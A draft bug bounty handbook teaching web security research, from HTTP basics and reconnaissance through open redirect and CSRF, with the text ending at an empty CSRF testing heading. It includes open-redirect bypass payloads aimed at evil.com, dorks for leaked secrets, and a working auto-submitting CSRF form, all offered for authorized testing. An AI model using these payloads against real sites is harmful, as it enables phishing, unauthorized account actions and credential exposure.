# The Bug Bounty Handbook

### A Practical Guide to Web Application Security Research and Vulnerability Reporting

---

**First Edition — Personal Working Draft**

*Compiled from an ongoing, hands-on mentorship in web application penetration testing and bug bounty methodology, synthesizing established industry references with real disclosed vulnerability case studies.*

---

## Preface

This handbook exists for one reason: to turn theoretical knowledge of web security into the practical, repeatable skill of finding and reporting real vulnerabilities.

Most people who want to break into bug bounty hunting start in one of two places. Either they dive straight into tool tutorials without understanding *why* a technique works, or they read vulnerability theory without ever touching a real target. Both paths lead to the same frustrating plateau: technically informed people who still can't find their first bug.

This book takes a different approach. Every chapter builds on the one before it. HTTP fundamentals come before vulnerability classes, because every vulnerability in this book is, at its core, a misuse of HTTP. Reconnaissance comes before hunting, because the hunters who consistently find bugs are the ones who understand a target better than anyone else testing it. Reporting comes after hunting, because a technically perfect finding with a poorly written report is functionally the same as no finding at all.

This is meant to be read start to finish the first time, and referenced chapter by chapter every time after that. It is a living document — new chapters, corrections, and refinements will be added as the underlying research and practice continues.

## How to Use This Book

Each chapter follows a consistent structure: learning objectives, theory, real-world case studies, a practical walkthrough, common mistakes, professional tips, a cheat sheet, and a set of exercises ranging from foundational to advanced. Read the theory sections carefully — they exist to build the mental models that let you recognize a vulnerability you've never seen documented before, not just recite ones you have.

Wherever you see `[Insert Screenshot Here]`, this marks a place to drop in your own Burp Suite or browser screenshot once you've walked through the exercise yourself. This handbook is meant to become *yours* over time.

---

# Introduction: The Bug Bounty Landscape

Bug bounty hunting is the practice of legally testing an organization's software for security vulnerabilities in exchange for recognition or monetary reward, operating under an explicit scope and set of rules the organization defines. It sits at the intersection of penetration testing, security research, and — increasingly — a legitimate career path.

The appeal is obvious: no formal gatekeeping, direct feedback from real security teams, and the chance to be paid for finding something an organization's own engineers missed. The reality is more demanding: consistent success requires strong fundamentals, patient reconnaissance, and — perhaps most underrated — the discipline to communicate findings clearly enough that a busy triager takes them seriously.

This handbook assumes a working foundation in Linux, networking, basic web penetration testing concepts, and general-purpose scripting. It does not re-teach those basics. What it does teach is how to convert that foundation into the specific, disciplined workflow that separates hobbyist testing from a hunter who reliably finds and reports valid, well-received vulnerabilities.


---

# Part I — Foundations

Part I establishes the mental models and technical environment every later chapter depends on: the mindset of a working hunter, a properly configured lab, a deep understanding of HTTP, and a map of how modern web applications are actually built. Skipping this part to get to "the real vulnerabilities" is the single most common reason beginners stall — nearly every bug in Part III is really just one of these foundational concepts, misused.

## Chapter 1 — The Hacker Mindset and Industry Reality

### Learning Objectives
By the end of this chapter, you will be able to:
- Describe the recurring workflow professional bug hunters use on every target
- Identify the most common mindset mistakes that keep beginners from finding their first bug
- Set realistic expectations for how long, and how difficult, the path to a first paid bounty actually is

### Theory

Most rejected reports and most cases of hunter burnout trace back to mindset, not to a lack of technical skill. Before touching a single tool, it is worth internalizing how the failure modes actually look in practice, because they are far more common — and far more fixable — than any missing technical skill.

**Table 1.1 — Beginner vs. Professional Mindset**

| Beginner approach | Professional approach |
|---|---|
| "I'll scan for XSS everywhere" | "What is this app's trust boundary? Where does user input cross it?" |
| "I need to find something today" | "I need to understand this app well enough that bugs become obvious" |
| "This target has 500 hunters already, I have no chance" | "Where are the other 499 hunters *not* looking?" |
| "I'll test everything on the whole domain" | "I'll go deep on 2–3 attack surfaces rather than shallow on all of them" |
| "A report is a technical proof" | "A report is a piece of persuasive writing for a busy human triager" |

The core loop underlying nearly all successful bug hunting can be represented as a simple, repeating cycle:

```
┌─────────┐    ┌─────────────┐    ┌──────────┐    ┌────────────┐
│  RECON  │ →  │ UNDERSTAND  │ →  │   TEST   │ →  │  REPORT /  │
│ (map    │    │ (how does   │    │ (probe   │    │  or MOVE   │
│  the    │    │  data flow, │    │  trust   │    │    ON      │
│  target)│    │  auth work) │    │ boundary)│    │            │
└─────────┘    └─────────────┘    └──────────┘    └────────────┘
      ↑                                                  │
      └──────────────────────────────────────────────────┘
                 (repeat on new feature/endpoint)
```

This loop — not "run a scanner and wait" — is what separates hunters who eventually get paid from hunters who quit after two quiet weeks.

### Real-World Examples

Nearly every published vulnerability disclosure, once traced back to its origin, began with a hunter noticing something slightly *off* — a parameter that seemed unnecessary, a redirect that felt too permissive, a response that took a fraction of a second longer than expected — and then deliberately chasing that anomaly rather than running an automated tool and waiting for a report. The technical chapters throughout this book are full of exactly this pattern.

### Practical Walkthrough

1. Create accounts on at least two major bug bounty platforms (HackerOne, Bugcrowd) purely to explore their interface, policy pages, and disclosed-report archives — do not submit anything yet.
2. Read ten disclosed reports of any severity on a platform's public activity feed. For each, write one sentence describing exactly what *trust boundary* was crossed.
3. Identify, honestly, which of the mindset mistakes in Table 1.1 you are most prone to.

### Common Mistakes

- **Scanner-first hunting.** Running automated tools against a target with hundreds of other active hunters and expecting a novel hit — obvious, automatable bugs are found and patched within hours on popular programs.
- **Report spam.** Submitting low-effort or purely informational findings (missing security headers, self-XSS with no chaining, generic best-practice suggestions). This wastes a security team's time, gets marked invalid, and can lead to a ban from the program.
- **Chasing the "sexy" bug.** New hunters fixate on remote code execution or SQL injection. In reality, a realistic first bounty is far more likely to be an access-control flaw, a business logic bug, or an IDOR — findings that reward creativity over exploit-development skill.
- **Giving up after one quiet week.** Bug hunting has high variance. Long dry spells are normal even for experienced researchers, not evidence of personal inadequacy.
- **Ignoring the scope and policy page.** Testing an asset or vulnerability class explicitly listed as out of scope is the single fastest way to have a report closed — or, in the worst case, to create legal exposure.

### Professional Tips

- Expect a first valid, paid bug to take weeks to a few months of consistent effort. Anyone promising faster results is generally not describing the median experience.
- Expect early bounties to be low-to-medium severity: an IDOR on a non-critical feature, a business logic flaw, a CSRF on a low-impact action — not a five-figure critical.
- Duplicates are the norm on any actively hunted, popular program. A duplicate is not evidence you did something wrong.

### Key Takeaways

Bug hunting success is driven more by mindset and workflow discipline than by raw technical depth at the outset. The core loop — Recon → Understand → Test → Report or Move On — should become automatic. Expect a slow, high-variance first few months; that variance is structural to the activity, not a signal about your aptitude.

### Cheat Sheet

- Before testing anything: read the scope and policy page in full.
- Ask of every feature: *"Where does user-controlled input cross a trust boundary?"*
- Depth beats breadth: two or three features tested thoroughly outperforms shallow coverage of an entire application.
- A finding is not complete until its impact can be explained in one sentence a non-technical person would understand.

### Exercises

1. **(Foundational)** List, in your own words, the four steps of the core hunting loop and give one concrete example of each from a target you've browsed.
2. **(Intermediate)** Read five disclosed IDOR or logic-flaw reports on a public disclosure feed. For each, identify what likely prompted the researcher to test that specific feature.
3. **(Advanced)** Draft a one-page personal "rules of engagement" document describing how you will handle scope verification, report validation, and dry-spell persistence going forward.

### Practice Labs
No hands-on labs at this stage — Chapter 1 is entirely conceptual. Technical labs begin in Chapter 5.

### Review Questions
1. Why does depth generally outperform breadth when testing a target?
2. Name two reasons a technically valid finding might still be closed as not applicable.
3. What should always be verified before testing a target for the first time?

### My Notes
*(Use this space to record your own early observations, false starts, and personal reflections as you begin hunting. This section is intentionally left for your own additions.)*

## Chapter 2 — Building the Hunting Lab

### Learning Objectives
- Configure a browser-and-proxy testing environment correctly
- Select and install the essential Burp Suite extensions for efficient hunting
- Establish an external reconnaissance toolchain and a disciplined notes system

### Theory

Every piece of traffic between a browser and a target should pass through an intercepting proxy before it reaches the wire. This single habit — routing everything, including casual browsing, through Burp Suite — is what turns ordinary use of an application into passive reconnaissance.

```
┌──────────┐        ┌──────────┐        ┌──────────┐
│ Browser  │ <────> │  Proxy   │ <────> │  Target  │
│ (Firefox)│        │  (Burp)  │        │  Server  │
└──────────┘        └──────────┘        └──────────┘
                          │
                    Every request/response
                    is visible and editable
                    here before it's sent
```

### Practical Walkthrough

**1. Browser and proxy.** Dedicate a separate Firefox profile to hunting, with the proxy set to `127.0.0.1:8080` and Burp's CA certificate imported. Keep a second browser profile isolated for research, so target traffic capture stays uncontaminated.

**2. Burp Suite extensions (via the BApp Store).**

| Extension | Purpose |
|---|---|
| Autorize | Automatically detects broken access control by replaying requests under a lower-privileged session |
| Logger++ | Persistent, searchable log of every request Burp has observed |
| Param Miner | Discovers hidden or unlinked parameters and headers |
| Turbo Intruder | Scriptable, high-speed request sending, essential for race-condition testing |
| JSON Web Tokens | Decodes and edits JWTs directly inside Burp |
| Auto Repeater / AuthMatrix | Automates swapping session tokens across many requests for privilege testing |

**3. External recon toolchain.**

```bash
# Standard chained recon workflow
subfinder -d target.com -o subs.txt
cat subs.txt | httpx -silent -title -tech-detect
echo target.com | waybackurls
nuclei -l alive_hosts.txt -silent
```

- **subfinder / Amass** — passive subdomain enumeration
- **httpx** — probes which discovered hosts are alive and fingerprints their technology
- **Nuclei** — template-based scanning for known misconfigurations and CVEs (a triage aid, never a substitute for manual testing)
- **Gobuster / ffuf / Dirsearch** — content and directory discovery
- **SecLists** (`danielmiessler/SecLists`) — the standard wordlist reference repository

**4. Notes system.** Notes are the real long-term competitive advantage in this field, not tool count.

```
/bugbounty-notes/
  /program-name/
    recon.md          ← subdomains, endpoints, tech stack found
    interesting.md     ← weird behavior, half-leads, "come back to this"
    reports/
      draft-1.md
    poc/
      screenshots, curl exports, Burp requests
```

**5. Reporting template**, prepared in advance so writing never becomes the bottleneck once a bug is found:

```markdown
## Title
## Summary
## Severity (with reasoning)
## Steps to Reproduce
1.
2.
## Proof of Concept
## Impact
## Suggested Fix
```

[Insert Screenshot Here — Burp Suite proxy configuration]
[Insert Screenshot Here — BApp Store with extensions installed]

### Common Mistakes
- Skipping the proxy for "quick" manual checks, losing the passive traffic log in the process.
- Installing far more extensions than can be meaningfully learned, rather than mastering the small, high-leverage set above.
- Delaying a notes system until scope has already grown too large to retrofit cleanly.

### Professional Tips
Log every unusual response, not only confirmed bugs. An observation dismissed today is frequently the missing piece of a chained exploit discovered weeks later.

### Key Takeaways
A hunting lab is Firefox routed through Burp with proxy discipline enforced at all times, a small set of high-leverage extensions, an external recon chain (subfinder → httpx → nuclei, plus SecLists), and a disciplined notes and reporting system. Discipline, not tool count, is the actual differentiator.

### Cheat Sheet
```bash
git clone https://github.com/danielmiessler/SecLists.git
subfinder -d target.com | httpx -silent | nuclei -silent
```

### Exercises
1. **(Foundational)** Confirm Firefox routes all traffic through Burp and HTTPS interception works cleanly on a test site.
2. **(Intermediate)** Install all five recommended extensions and run each once against a lab environment to confirm functionality.
3. **(Advanced)** Build and test a personal notes folder structure, populated with one full recon cycle against a real, in-scope target.

### Practice Labs
No PortSwigger labs at this stage. Focus this chapter's effort on tool installation and configuration.

### Review Questions
1. Why should even casual browsing of a target be routed through the proxy?
2. What is the functional difference between Repeater and Intruder in Burp Suite?
3. Why do experienced hunters emphasize notes discipline over the number of tools installed?

### My Custom Methodology
*(Record your personal lab configuration choices, preferred extensions, and any custom scripts you build here.)*

## Chapter 3 — HTTP Deep Dive

### Learning Objectives
- Explain the full HTTP request/response lifecycle
- Distinguish session-based and token-based authentication, including JWT internals
- Explain the Same-Origin Policy and how CORS deliberately loosens it

### Theory

Every vulnerability catalogued later in this book is, at root, a misunderstanding of one of the concepts in this chapter, exploited. Fluency here is the single highest-leverage investment a beginner can make.

**The request lifecycle:**

```
1. URL typed              2. DNS resolves          3. TCP handshake
   https://target.com/x →    hostname to IP     →     (SYN/SYN-ACK/ACK)
                                                              │
4. TLS handshake (HTTPS)                                     ▼
   negotiates encryption      ←──────────────────  5. Browser sends
                                                        HTTP request
                                                              │
                                                              ▼
                                              6. Server sends HTTP response
                                                              │
                                                              ▼
                                              7. Browser renders response
```

**Request methods** carry intended, but not enforced, meaning:

| Method | Intended purpose | Security relevance |
|---|---|---|
| GET | Retrieve data, no side effects | A state-changing GET is a CSRF risk |
| POST | Create or perform an action | Primary target for CSRF and logic-flaw testing |
| PUT | Update a resource | Often under-protected relative to POST |
| DELETE | Remove a resource | Frequently omitted from access-control checks |
| OPTIONS | CORS preflight negotiation | Central to CORS misconfiguration |
| PATCH | Partial update | Common in modern REST APIs, often less tested |

Because the specification never enforces these meanings, a GET request that deletes a record — breaking the "safe method" convention — becomes directly attackable, a pattern revisited throughout Part III.

**Status codes** function as a conversation, not noise:

```
2xx → "here you go"          (200 OK, 201 Created)
3xx → "look over there"      (301/302 — a common open-redirect vector)
4xx → "you made a mistake"   (401 unauthenticated, 403 forbidden, 404 not found)
5xx → "the server erred"     (500 — often leaks stack traces, an info-disclosure risk)
```

Applications frequently return `200 OK` with an error message embedded in the body — never trust the status code alone; always inspect the body.

**Statelessness and authentication.** HTTP treats every request as new, with no memory of prior communication. Applications compensate with one of two mechanisms:

*Session-based authentication:*
```
Login  → server creates a session, stores it server-side, issues a session ID as a cookie
Every subsequent request → browser auto-attaches the cookie → server looks up the session
Logout → server deletes the session → the cookie becomes worthless even if stolen
```

*Token-based authentication (JWT):*
```
HEADER.PAYLOAD.SIGNATURE
{alg,typ}.{claims}.{signature of header+payload using a secret or private key}
```
The server verifies the signature on every request without storing session state. A signature guarantees **integrity**, not confidentiality — any JWT payload can be base64-decoded and read by anyone, with or without the signing key.

Three JWT failure modes worth internalizing now, revisited in depth in Chapter 15:
1. **`alg: none`** — an unsigned token accepted as valid by a permissive server.
2. **Algorithm confusion (RS256 → HS256)** — a token meant to be RSA-verified is instead HMAC-forged using the public key as the secret.
3. **Weak or leaked signing secrets** — brute-forceable or exposed via an unrelated vulnerability elsewhere.

**Same-Origin Policy and CORS.** Two URLs share an origin only when protocol, hostname, and port all match. The Same-Origin Policy is the browser's default rule preventing a script on one origin from reading a response from another — this is why a script on an attacker's page cannot read your banking session's data even though your browser did send the request with your cookies attached.

```
              SOP default: DENY cross-origin JS reads
attacker.com ──(fetch)──► onlinebank.com
     ▲                          │
     └────── browser blocks ────┘  (response received, but JS on
                                     attacker.com cannot read it)
```

CORS is the deliberate, header-driven mechanism that loosens this restriction when a server explicitly opts in via `Access-Control-Allow-Origin`. Chapter 17 covers what happens when this header is misconfigured.

[Insert Burp Suite Example — a captured JWT-based login request and response]

### Real-World Examples
Session-cookie versus JWT-based authentication can usually be identified within seconds of capturing a login request in Burp. Applications frequently mix both across different subdomains or microservices — recognizing which mechanism is in play at each layer is a recurring theme in Chapter 15.

### Common Mistakes
- Assuming every modern API uses JWT; plain session cookies remain widespread.
- Confusing the Same-Origin Policy with CORS — SOP is the default restriction, CORS is the deliberate exception mechanism.
- Trusting a `200 OK` status without reading the response body.

### Key Takeaways
HTTP is stateless by design; sessions and tokens exist purely to compensate. JWTs prove integrity, never confidentiality. SOP is the default; CORS is the intentional, header-controlled loosening of it.

### Cheat Sheet
```
Session auth:  cookie → server-side lookup → instantly revocable
Token auth:    JWT → signature verification, no server-side state
SOP default:   deny cross-origin JS read access
CORS header:   Access-Control-Allow-Origin: <trusted-origin>
JWT risks:     alg:none · algorithm confusion · weak/leaked secret
```

### Exercises
1. **(Foundational)** Capture a login request in Burp on a test application and identify whether it uses session cookies or a JWT.
2. **(Intermediate)** Manually base64-decode a captured JWT's header and payload without a decoding tool.
3. **(Advanced)** Find one real request/response pair where the status code and the body content disagree, and explain the discrepancy.

### Practice Labs
- PortSwigger Web Security Academy: introductory authentication topic labs (read-only exploration is sufficient at this stage)

### Review Questions
1. Why does a signed JWT protect against tampering but not against disclosure of its contents?
2. Why would a developer ever need CORS if the Same-Origin Policy already restricts cross-origin access?
3. Why is trusting a status code alone a dangerous habit?

## Chapter 4 — Web Application Architecture

### Learning Objectives
- Describe the layered structure of a modern web application
- Compare REST and GraphQL, and explain why GraphQL raises IDOR risk
- Distinguish authentication from authorization precisely

### Theory

```
┌─────────────────────────────────────────────────────────────┐
│  CDN / WAF (Cloudflare, Akamai)  ← caches static content,     │
│                                     filters malicious traffic  │
└───────────────────────┬───────────────────────────────────────┘
                         │
┌───────────────────────▼───────────────────────────────────────┐
│  Load Balancer  ← spreads requests across many backend servers │
└───────────────────────┬───────────────────────────────────────┘
                         │
┌───────────────────────▼───────────────────────────────────────┐
│  Frontend (React/Vue/Angular)  ← renders UI, calls APIs        │
└───────────────────────┬───────────────────────────────────────┘
                         │  (REST / GraphQL calls)
┌───────────────────────▼───────────────────────────────────────┐
│  API Gateway  ← routes to the correct microservice, often where│
│                 auth/rate-limiting is enforced (or is not)     │
└───────────┬─────────────┬─────────────┬───────────────────────┘
            ▼             ▼             ▼
      ┌─────────┐   ┌───────────┐  ┌───────────┐
      │ Auth Svc│   │ User Svc  │  │Payment Svc│  ← microservices
      └─────────┘   └───────────┘  └───────────┘
            │             │             │
      ┌─────▼─────────────▼─────────────▼───────┐
      │        Databases / Cloud Storage         │
      └───────────────────────────────────────────┘
```

Every layer is independently attackable, and — a point revisited constantly throughout reconnaissance and testing — every layer can enforce security inconsistently. A frontend may correctly hide a feature from a user, while the underlying API endpoint never re-verifies that restriction; this single gap accounts for a large share of the access-control findings covered in Chapter 16.

**REST vs. GraphQL.** REST structures endpoints predictably around resource and action, commonly `/RESOURCE/ACTION`. GraphQL exposes a single endpoint through which a client requests exactly the fields it needs, including deeply nested related objects, in one call.

```
REST equivalent of "get my name and my shop's domain":
GET /users/me
GET /shops/me/domain
   (2 calls, 2 separate authorization checks)

GraphQL equivalent:
query { me { name } shop { primaryDomain { url } } }
   (1 call — if authorization is checked inconsistently per field,
    a single gap becomes an IDOR)
```

A legacy but still-encountered alternative, SOAP, documents its entire structure in a WSDL file, discoverable by appending `.wsdl` or `?wsdl` to an endpoint.

**Authentication vs. authorization.**

```
AUTHENTICATION: "who are you?"          AUTHORIZATION: "what are you allowed to do?"
┌──────────┐                            ┌──────────┐
│  Login   │  → issues session/token    │ Request  │  → does THIS session/token
│ (creds)  │                            │ (any     │     owner have permission for
└──────────┘                            │  action) │     THIS action on THIS object?
                                        └──────────┘
```

An application can have flawless authentication and completely broken authorization simultaneously — this is the conceptual root of every IDOR and access-control finding in this book.

### Common Mistakes
- Treating "logged in" as equivalent to "authorized for everything."
- Ignoring GraphQL introspection, which — when left enabled — hands over the entire API schema.
- Assuming an application is REST-only because the visible frontend looks conventional, without checking for a hidden `/graphql` endpoint.

### Key Takeaways
Modern applications are layered systems where security enforcement can vary independently at each layer. GraphQL's flexibility increases IDOR risk relative to REST. Authentication and authorization are distinct checks, and most serious findings live in gaps in the second.

### Cheat Sheet
```
REST:      GET /resource/action
GraphQL:   POST /graphql {query {...}}
SOAP:      check for ?wsdl or .wsdl
AuthN ≠ AuthZ — always verify BOTH independently
```

### Exercises
1. **(Foundational)** Map, from Burp history, which frontend actions on a real application call REST endpoints versus a GraphQL endpoint.
2. **(Intermediate)** Check whether a GraphQL endpoint you've found has introspection enabled.
3. **(Advanced)** Identify one feature where authentication is clearly enforced but authorization may not independently be verified, and document your reasoning.

### Practice Labs
- PortSwigger Web Security Academy: GraphQL API vulnerabilities (topic overview)

### Review Questions
1. Why does GraphQL's flexibility increase IDOR risk relative to REST?
2. Give one concrete example distinguishing "authentication works" from "authorization is broken."
3. Why can a CDN itself represent an attack surface rather than only a performance layer?


---

# Part II — Reconnaissance

## Chapter 5 — The Complete Reconnaissance Methodology

### Learning Objectives
- Execute a full passive and active reconnaissance workflow
- Extract hidden endpoints, parameters, and secrets from JavaScript
- Build a repeatable, automated recon pipeline

### Theory

Reconnaissance is where most beginners should spend the largest share of their time, and where experienced hunters say their real edge comes from — not superior exploit knowledge, but a deeper understanding of the target than anyone else currently testing it.

```
                    PASSIVE RECON                    ACTIVE RECON
              (never touch the target directly)   (directly interact with target)
              ┌─────────────────────────┐         ┌──────────────────────────┐
              │ Google/GitHub dorking    │         │ Subdomain brute-forcing   │
              │ Wayback Machine          │         │ Directory brute-forcing   │
              │ Shodan/Censys            │         │ Port scanning (Nmap)      │
              │ Certificate transparency │         │ Vhost enumeration         │
              │ crt.sh                   │         │ Parameter fuzzing         │
              └─────────────────────────┘         └──────────────────────────┘
                     do this FIRST                      then this
```

**Google and GitHub dorking.** Advanced search operators surface content that normal browsing never reveals:

| Operator | Purpose |
|---|---|
| `site:` | Restrict results to a domain |
| `inurl:` | Search for a known-vulnerable URL pattern |
| `intitle:` | Search page titles, useful for exposed admin panels |
| `filetype:` | Find exposed configuration or backup files (`filetype:env`, `filetype:sql`) |

GitHub-specific dorking (`org:target-name password`, or `site:github.com "target.com" api_key`) frequently surfaces hardcoded secrets left in commit history, including deleted branches.

**Wayback Machine.** Archived snapshots reveal old API endpoints, deprecated admin panels, and forgotten parameters no longer linked anywhere live.

```bash
echo target.com | waybackurls > urls.txt
```

**Subdomain enumeration.**

```bash
subfinder -d target.com -o subs.txt
amass enum -d target.com
gobuster dns -d target.com -w subdomains-wordlist.txt
```

Recursive enumeration (subdomains of subdomains) and permutation tools (Altdns) frequently surface additional assets that a single pass misses.

**Service and port enumeration.** Nmap directly probes discovered live hosts; Shodan and Censys allow passive discovery of exposed services without sending the target a single packet.

**Content and directory discovery.**

```bash
dirsearch -u https://target.com -e php,js,json
gobuster dir -u https://target.com -w SecLists/Discovery/Web-Content/raft-large-directories.txt
```

A `200` confirms existence; a `404` confirms absence; a `403` confirms existence with protection — always investigate 403s further, since bypasses (extra slashes, case variation, alternate methods) sometimes succeed. An exposed `.git/` directory is a particularly high-value find: reconstructing the repository from `.git/objects` can hand over an application's entire source code.

**JavaScript reconnaissance.**

```bash
python linkfinder.py -i https://target.com/app.js -o cli
```

JavaScript files routinely leak hidden API endpoints and, occasionally, hardcoded credentials or API keys — grep every discovered file for `api_key`, `secret`, `token`, and similar patterns.

**Parameter and API discovery.**

```bash
arjun -u https://target.com/endpoint
```
For GraphQL, test introspection directly:
```json
{"query":"{__schema{types{name}}}"}
```

**Virtual host and technology fingerprinting.** Fuzzing the `Host:` header against a single IP can reveal internal or staging applications hosted on shared infrastructure but never publicly linked. Wappalyzer and `httpx -tech-detect` fingerprint the underlying stack, directly informing which vulnerability classes are plausible.

**The complete workflow:**

```
subfinder/amass (subdomains)
      │
      ▼
httpx (probe alive, grab tech/titles)
      │
      ▼
waybackurls + gobuster/dirsearch (content discovery)
      │
      ▼
LinkFinder on discovered JS (hidden endpoints, secrets)
      │
      ▼
Arjun/Param Miner (hidden parameters)
      │
      ▼
nuclei (known CVE/misconfig triage)
      │
      ▼
Manual testing begins (Part III)
```

[Insert Screenshot Here — subfinder/httpx chained output]

### Common Mistakes
- Running a single automated tool once and considering reconnaissance complete.
- Skipping JavaScript analysis because it is tedious, despite it being a consistently high-value source of real findings.
- Failing to preserve raw recon output for future diffing.

### Professional Tips
Schedule recon on a recurring basis and diff the results day over day; the difference often surfaces newly deployed functionality before any other hunter notices it.

### Key Takeaways
Reconnaissance splits cleanly into passive and active phases, always passive first. JavaScript analysis and exposed `.git` directories are disproportionately valuable. The purpose of recon is not a subdomain list — it is a complete map of every entry point an attacker could reach.

### Cheat Sheet
```bash
subfinder -d target.com -o subs.txt
cat subs.txt | httpx -silent -title -tech-detect
echo target.com | waybackurls
gobuster dns -d target.com -w subs-wordlist.txt
dirsearch -u https://target.com -e php,js,json
python linkfinder.py -i https://target.com/app.js -o cli
```

### Exercises
1. **(Foundational)** Run the full recon chain against an in-scope target and log every discovered subdomain.
2. **(Intermediate)** Extract and analyze one JavaScript file for hidden endpoints or secrets.
3. **(Advanced)** Set up a scheduled recon job with output diffing to detect newly deployed assets automatically.

### Practice Labs
- Practice this methodology against any public program with a recon-friendly scope policy; PortSwigger labs are not applicable to reconnaissance practice.

### Review Questions
1. Why should passive recon always precede active recon?
2. Why does a `403` response deserve more attention than a `404` during directory brute-forcing?
3. Why is an exposed `.git/` directory considered a particularly high-value finding?

### My Recon Workflow
*(Document your personalized recon pipeline, preferred tool order, and any custom scripts here as your methodology matures.)*


---

# Part III — Vulnerability Classes

Part III catalogs the major vulnerability classes encountered in modern web applications and APIs. Each chapter follows a consistent structure — definition, root cause, real-world impact, discovery process, manual testing, Burp workflow, automation, false positives, verification, reporting, prevention, and case studies — so that any chapter can serve as a standalone field reference during an active engagement.

## Chapter 6 — Open Redirect

### Learning Objectives
- Define open redirect and identify its exploitation mechanics
- Recognize common bypass techniques when direct redirection is blocked
- Understand why this "low-severity" bug matters disproportionately when chained

### Definition
An open redirect exists when an application trusts attacker-controlled input to redirect a user to another site, typically through a URL parameter, an HTML `<meta>` refresh tag, or the DOM's `window.location` property.

### Root Cause
```
Legitimate flow:  https://target.com/?redirect_to=https://target.com/dashboard
                       → 302 Found → Location: https://target.com/dashboard

Attack flow:      https://target.com/?redirect_to=https://evil.com
                       → 302 Found → Location: https://evil.com
```
The server returns a redirect status with a `Location` header pointing wherever the parameter says, without validating that the destination belongs to the application's own domain.

### Real-World Impact
On its own, an open redirect looks low severity — the value comes from combination. A link such as `https://real-bank.com/login?next=https://evil.com` appears trustworthy in a preview or email, then silently forwards the victim to a credential-harvesting page. Open redirects are also frequently chained into OAuth token theft when a `redirect_uri` is not strictly validated.

**Case Study — Shopify Login Redirect ($500).** The application only appended the redirect parameter to a hardcoded Shopify subdomain, so a plain external domain would not work. The researcher added a leading period to the parameter (`checkout_url=.attacker.com`), producing `mystore.myshopify.com.attacker.com` — a string that DNS resolves using its rightmost label, meaning it resolves to `attacker.com` entirely. This illustrates the chapter's central lesson: even partial control over a URL can change its resolved meaning through special characters.

**Case Study — HackerOne Interstitial Bypass ($500).** HackerOne warned users before following external redirects, but its Zendesk integration allowed a URL that stayed on the `hackerone.com` domain — avoiding the warning — while an injected script on a custom Zendesk account still redirected the victim. Every third-party integration a target relies on is a distinct attack vector worth separate enumeration.

### Discovery Process
Watch Burp's proxy history for GET requests carrying a URL-shaped value in a parameter. Common parameter names include `url=`, `redirect=`, `redirect_to=`, `next=`, `return_to=`, and `checkout_url=`, though naming varies widely by application.

### Manual Testing / Burp Workflow
1. Identify a candidate redirect parameter in Repeater.
2. Replace its value with an external domain and observe the `Location` header and status code in the response.
3. If a full external domain is rejected, attempt the following bypasses:

```
https://trusted.com.evil.com     (DNS rightmost-label trick)
https://trusted.com@evil.com     (@ confusion)
//evil.com                       (protocol-relative)
https://evil.com%2F@trusted.com  (encoding trick)
```
4. If the redirect occurs client-side, inspect the page source for `window.location` or `<meta refresh>` usage tied to the parameter.

### Automation
Burp's Param Miner and pattern-matching tools such as `gf redirect` can surface candidate parameters across a large URL corpus gathered during reconnaissance, but every hit requires manual confirmation — this class has a notably high false-positive rate from automation alone.

### False Positives
A redirect to another URL on the same registrable domain is not a vulnerability. Frameworks that correctly validate redirects against an allowlist should not be reported simply because a redirect parameter exists.

### Verification
Confirm the `Location` header (or client-side redirect target) resolves to a domain genuinely outside the application's control, not merely a subdomain or path variation of the target itself.

### Reporting
Because this bug looks inherently low-severity, always frame impact in terms of phishing potential or, ideally, chain it with an OAuth flow to demonstrate higher severity. A screenshot of the browser landing on an obviously external domain after clicking what appeared to be the target's own link is strong supporting evidence.

### Prevention
Applications should validate redirect destinations against a strict allowlist of exact domains, never a prefix or suffix match, and should avoid client-side redirect logic driven directly by unvalidated user input.

### Key Takeaways
Open redirects exploit trust in a URL parameter, `<meta>` refresh tag, or `window.location`. Low severity in isolation, but a genuine phishing and OAuth-chaining primitive. Always attempt bypass techniques (DNS-suffix, `@`, protocol-relative) before concluding a redirect parameter is safe.

### Cheat Sheet
```
Look for params: url=, redirect=, redirect_to=, next=, return_to=, r=, u=
Test payloads:
  https://evil.com
  https://trusted.com.evil.com
  https://trusted.com@evil.com
  //evil.com
```

### Exercises
1. **(Foundational)** Identify a redirect parameter in a test application and confirm whether external redirection is possible.
2. **(Intermediate)** Attempt all four listed bypass techniques against a filtered redirect parameter in a lab environment.
3. **(Advanced)** Draft a mock report chaining an open redirect into a hypothetical OAuth token-theft scenario.

### Practice Labs
- PortSwigger Web Security Academy: "DOM-based open redirection"; "Open redirection"

### Review Questions
1. Why is a same-domain redirect not considered a vulnerability, even with a user-controlled parameter?
2. Explain why `mystore.myshopify.com.attacker.com` resolves to `attacker.com`.
3. Why does chaining an open redirect with OAuth substantially increase its severity?

### References
- OWASP: Unvalidated Redirects and Forwards Cheat Sheet
- PayloadsAllTheThings — Open Redirect

## Chapter 7 — Cross-Site Request Forgery (CSRF)

### Learning Objectives
- Explain how browsers' automatic cookie attachment enables CSRF
- Distinguish GET-based and POST-based CSRF exploitation
- Evaluate whether stated CSRF defenses are actually effective

### Definition
CSRF forces a victim's browser to send a state-changing, authenticated request to a target application without the victim's knowledge, by exploiting the browser's automatic attachment of cookies to any request sent to that domain.

### Root Cause
```
You (logged into bank.com)          Malicious site (evil.com)
        │                                    │
        │  1. You visit evil.com             │
        │ ◄──────────────────────────────────┤
        │  2. Page auto-submits hidden form   │
        │     or <img> to bank.com/transfer    │
        ├─────────────────────────────────────►
        │  3. Browser auto-attaches YOUR       │
        │     bank.com cookies                 │
        ├─────────────────────────────────────► bank.com
        │                                    processes the transfer
        │                                    as if the victim did it
```

### Real-World Impact
**Case Study — Shopify Twitter-Disconnect ($500).** A GET request handled a state-changing account action with no CSRF validation; simply visiting a crafted URL — no form submission required — disconnected the victim's linked account.

### Discovery Process

**GET-based CSRF** requires nothing more than an image tag, since browsers issue a GET request for any `<img>` source and attach cookies automatically:
```html
<img src="https://bank.com/transfer?from=bob&to=joe&amount=500">
```

**POST-based CSRF** requires a hidden, auto-submitting form:
```html
<iframe style="display:none" name="csrf-frame"></iframe>
<form method='POST' action='http://bank.com/transfer' target="csrf-frame" id="csrf-form">
  <input type='hidden' name='from' value='Bob'>
  <input type='hidden' name='to' value='Joe'>
  <input type='hidden' name='amount' value='500'>
</form>
<script>document.getElementById("csrf-form").submit()</script>
```

For JSON-based endpoints, a browser issues a preflight `OPTIONS` request first; if the CORS policy does not trust the attacker's origin, the browser blocks the actual request from being sent. Switching the `Content-Type` to `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain` — none of which trigger a preflight — is a common, effective bypass when the endpoint accepts it.

### Manual Testing / Burp Workflow
